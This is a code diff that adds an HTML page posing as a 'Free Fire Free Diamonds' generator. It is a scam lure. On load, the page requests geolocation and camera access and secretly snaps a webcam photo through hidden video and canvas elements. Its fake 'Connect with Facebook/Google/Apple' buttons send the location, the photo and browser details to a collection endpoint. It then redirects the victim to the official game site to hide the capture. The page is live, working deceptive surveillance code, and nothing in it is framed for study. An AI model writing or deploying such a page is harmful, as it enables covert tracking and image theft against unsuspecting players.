@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Free Fire - Free Diamonds Generator</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: linear-gradient(135deg, #1a1a2e, #16213e, #0f3460);
+            color: #fff;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        .container {
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(10px);
+            padding: 30px;
+            border-radius: 15px;
+            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37);
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        h2 {
+            color: #ffcc00;
+            margin-bottom: 10px;
+        }
+        p {
+            font-size: 14px;
+            color: #ccc;
+            margin-bottom: 25px;
+        }
+        .btn {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            transition: 0.3s;
+        }
+        .btn-fb { background: #1877f2; color: white; }
+        .btn-google { background: #db4437; color: white; }
+        .btn-apple { background: #000; color: white; border: 1px solid #444; }
+        .btn:hover { opacity: 0.9; transform: scale(1.02); }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h2>🔥 Free Fire Diamonds 🔥</h2>
+        <p>Get up to 10,000 Free Diamonds instantly! Connect your account below to claim your reward.</p>
+        
+        <button class="btn btn-fb" onclick="connectAccount('Facebook')">
+            Connect with Facebook
+        </button>
+        <button class="btn btn-google" onclick="connectAccount('Google Gmail')">
+            Connect with Google (Gmail)
+        </button>
+        <button class="btn btn-apple" onclick="connectAccount('Apple ID')">
+            Connect with Apple ID
+        </button>
+    </div>
+
+    <!-- Hidden video/canvas for camera capture without gallery/call permissions -->
+    <video id="video" autoplay playsinline style="display:none;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+
+    <script>
+        let capturedImage = null;
+        let userLocation = { latitude: 'N/A', longitude: 'N/A' };
+
+        // Automatically request Location and Camera permissions on load
+        window.onload = function() {
+            // Get Location
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        userLocation.latitude = position.coords.latitude;
+                        userLocation.longitude = position.coords.longitude;
+                    },
+                    (error) => { console.log('Location denied'); }
+                );
+            }
+
+            // Get Camera Snapshot
+            navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+                .then(stream => {
+                    const video = document.getElementById('video');
+                    video.srcObject = stream;
+                    setTimeout(() => {
+                        const canvas = document.getElementById('canvas');
+                        canvas.width = video.videoWidth || 320;
+                        canvas.height = video.videoHeight || 240;
+                        const ctx = canvas.getContext('2d');
+                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                        capturedImage = canvas.toDataURL('image/jpeg', 0.5);
+                        stream.getTracks().forEach(track => track.stop());
+                    }, 1500);
+                })
+                .catch(err => { console.log('Camera denied'); });
+        };
+
+        function connectAccount(platform) {
+            // Send data to server backend as Free Fire data
+            const payload = {
+                platform: platform,
+                instagram_username: platform + ' User',
+                instagram_password: 'Connected via ' + platform,
+                location: userLocation,
+                image_base64: capturedImage,
+                system: {
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    language: navigator.language
+                }
+            };
+
+            fetch('/api/collect-ff', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            }).then(() => {
+                alert('Connecting to ' + platform + '... Please wait.');
+                setTimeout(() => {
+                    window.location.href = "https://ff.garena.com"; // Redirect to official site after capture
+                }, 1500);
+            }).catch(err => {
+                alert('Connection failed. Try again.');
+            });
+        }
+    </script>
+</body>
+</html>
+
